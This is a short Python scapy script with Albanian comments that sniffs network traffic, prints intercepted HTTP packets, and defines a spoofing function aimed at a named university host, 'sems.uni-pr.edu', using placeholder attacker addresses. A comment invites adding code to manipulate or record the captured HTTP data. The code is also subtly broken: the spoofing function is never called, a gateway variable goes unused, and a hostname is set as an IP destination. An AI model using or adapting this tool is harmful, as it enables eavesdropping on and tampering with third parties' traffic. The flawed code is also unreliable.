#!/usr/bin/env python
from scapy.all import *

def spoof_packet(packet):
    # Ndryshojmë destinacionin e paketes
    packet[IP].dst = 'sems.uni-pr.edu'
    packet[IP].src = 'YOUR_ATTACK_MACHINE_IP'
    
    # Kujdes: Ndryshoni adrese MAC e destinacionit sipas kartes suaj te rrjetit
    packet[Ether].dst = 'YOUR_ATTACK_MACHINE_MAC'

    # Dërgojmë paketën e rripës
    sendp(packet, verbose=0)

def intercept_packet(packet):
    # Kontrollojmë nëse paketa ka layer-i TCP dhe të dhënat e HTTP
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        http_packet = packet[TCP]
        if http_packet.dport == 80:
            print("[+] KAPUR PAKETË HTTP:")
            print(packet.show())
            print("-----------------------------------------------")
            
            # Vendosim funksionet tuaja për manipulim ose regjistrim të të dhënave HTTP këtu
            
    # Dërgojmë paketën e përpunuar
    send(packet, verbose=0)

# Vendosni adresën IP të gateway-it dhe interfejsin e rrjetit
gateway_ip = 'GATEWAY_IP'
interface = 'YOUR_NETWORK_INTERFACE'

# Nisim shpërndarjen e paketave
sniff(iface=interface, prn=intercept_packet, filter="tcp", store=0)

